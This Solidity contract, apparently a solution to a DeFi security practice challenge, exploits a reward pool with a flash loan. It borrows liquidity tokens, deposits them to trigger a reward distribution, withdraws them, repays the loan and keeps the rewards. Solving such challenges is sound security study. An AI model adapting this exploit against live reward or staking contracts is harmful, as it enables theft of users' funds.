// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import { FlashLoanerPool } from "./FlashLoanerPool.sol";
import { TheRewarderPool } from "./TheRewarderPool.sol";
import { RewardToken } from "./RewardToken.sol";

contract TheRewarderAttacker {

    TheRewarderPool rewarderPool;

    constructor(TheRewarderPool _rewarderPool) {
        rewarderPool = _rewarderPool;
    }

    function attack(FlashLoanerPool flashLoanerPool, uint256 amount) public {
        // Request a flash loan of the `liquidityToken`
        flashLoanerPool.flashLoan(amount);
        RewardToken rewardToken = rewarderPool.rewardToken();
        // Transfer the `rewardToken`s gained within the `receiveFlashLoan` hook to the player
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) public {
        // Cast to ERC20
        RewardToken liquidityToken = RewardToken(rewarderPool.liquidityToken());
        liquidityToken.approve(address(rewarderPool), amount);

        // Deposit and distribute rewards to earn `rewardToken`s
        rewarderPool.deposit(amount);
        // Withdraw the `liquidityTokens` deposited, now that we have the reward
        rewarderPool.withdraw(amount);

        // Pay back the flash loan
        liquidityToken.transfer(msg.sender, amount);
    }

}
